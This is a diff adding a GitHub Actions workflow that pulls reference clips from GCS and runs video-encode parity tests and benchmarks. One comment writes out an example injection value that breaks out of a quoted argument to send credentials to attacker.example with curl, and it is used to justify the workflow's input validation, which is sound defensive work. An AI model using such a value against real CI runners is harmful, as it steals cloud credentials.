@@ -1,0 +1,131 @@
+name: Single-pass parity + benchmark
+
+# Manual trigger only. The parity script encodes real H.264 video twice per
+# template fixture; the benchmark does it BENCH_REPEATS times. Both are too
+# slow for PR CI. Run before flipping single_pass_encode_enabled.
+#
+# See:
+#   src/apps/api/tests/quality/single_pass_parity.py
+#   src/apps/api/tests/benchmarks/single_pass_vs_multi.py
+#   .claude/plans/our-multi-clip-templates-tingly-pelican.md (Phase 0.5 / 0.6)
+#
+# Setup TODO (one-time):
+#   1. Stage a reference clip set in GCS at gs://<bucket>/<prefix>/. CLAUDE.md
+#      forbids raw clips in git, so this is the only sane source.
+#   2. Configure either GOOGLE_SERVICE_ACCOUNT_JSON or Workload Identity for
+#      this workflow to read that prefix. Existing Fly secret pattern works.
+#   3. Trigger via the Actions tab. Reports upload as workflow artifacts.
+
+on:
+  workflow_dispatch:
+    inputs:
+      clips_gcs_uri:
+        description: "GCS prefix holding reference .mp4 clips (e.g. gs://nova-parity-clips/v1/)"
+        required: true
+        type: string
+      run_parity:
+        description: "Run pixel-parity tests"
+        required: false
+        default: true
+        type: boolean
+      run_benchmark:
+        description: "Run wall-clock benchmark"
+        required: false
+        default: true
+        type: boolean
+      bench_repeats:
+        description: "Trials per template per render path (benchmark only)"
+        required: false
+        default: "1"
+        type: string
+
+jobs:
+  parity-and-bench:
+    runs-on: ubuntu-latest
+    # 4 fixtures (impressing-myself, just-fine, dimples-passport, rule-of-thirds)
+    # × 2 render paths × N trials at libx264 fast 1080x1920 on a 2-vCPU runner is
+    # ~3-4 min per encode pair for the heavier fixtures. Default BENCH_REPEATS=1
+    # keeps total runtime under 60 min. Bump bench_repeats on the dispatch form
+    # when you want tighter median bands and accept a 90+ min run.
+    timeout-minutes: 90
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: Install ffmpeg
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y ffmpeg
+          ffmpeg -version | head -1
+          ffprobe -version | head -1
+
+      - name: Install API dependencies
+        working-directory: src/apps/api
+        run: pip install -e ".[dev]"
+
+      - name: Authenticate to GCP
+        # Reusing the deploy account is fine; it has read on the parity bucket.
+        # If the parity bucket is separate, swap the secret name here.
+        uses: google-github-actions/auth@v2
+        with:
+          credentials_json: ${{ secrets.GOOGLE_SERVICE_ACCOUNT_JSON }}
+
+      - name: Set up gcloud
+        uses: google-github-actions/setup-gcloud@v2
+
+      - name: Download reference clips
+        env:
+          # Pass workflow_dispatch input through env: so it never reaches the
+          # shell as a template substitution. Stops ${{ inputs.clips_gcs_uri }}
+          # from breaking out of the quoted gsutil argument (a value like
+          # `gs://x/" /tmp/; curl -d @creds attacker.example; echo "` would
+          # otherwise execute against the GCP-authenticated runner).
+          CLIPS_URI: ${{ inputs.clips_gcs_uri }}
+        run: |
+          # Defense in depth: validate the input shape before use.
+          if [[ ! "$CLIPS_URI" =~ ^gs://[a-zA-Z0-9._/-]+$ ]]; then
+            echo "ERROR: clips_gcs_uri must match ^gs://[a-zA-Z0-9._/-]+$ — got '$CLIPS_URI'"
+            exit 1
+          fi
+          mkdir -p /tmp/parity-clips
+          gsutil -m cp "${CLIPS_URI%/}/"*.mp4 /tmp/parity-clips/
+          echo "Downloaded $(ls /tmp/parity-clips | wc -l) clips."
+          ls -lh /tmp/parity-clips
+
+      - name: Run parity tests
+        if: ${{ inputs.run_parity }}
+        working-directory: src/apps/api
+        env:
+          PARITY_CLIPS_DIR: /tmp/parity-clips
+          PARITY_REPORT_DIR: /tmp/parity-reports
+          # Real ffmpeg, no mocks; the test is the integration.
+          STORAGE_PROVIDER: "local"
+          STORAGE_BUCKET: "local-parity-bucket"
+        run: |
+          mkdir -p "$PARITY_REPORT_DIR"
+          pytest tests/quality/single_pass_parity.py -v
+
+      - name: Run benchmark
+        if: ${{ inputs.run_benchmark }}
+        working-directory: src/apps/api
+        env:
+          PARITY_CLIPS_DIR: /tmp/parity-clips
+          BENCH_REPORT_DIR: /tmp/parity-reports
+          BENCH_REPEATS: ${{ inputs.bench_repeats }}
+          STORAGE_PROVIDER: "local"
+          STORAGE_BUCKET: "local-parity-bucket"
+        run: |
+          mkdir -p "$BENCH_REPORT_DIR"
+          pytest tests/benchmarks/single_pass_vs_multi.py -v
+
+      - name: Upload reports
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: single-pass-reports-${{ github.run_id }}
+          path: /tmp/parity-reports/
+          if-no-files-found: warn
+          retention-days: 30
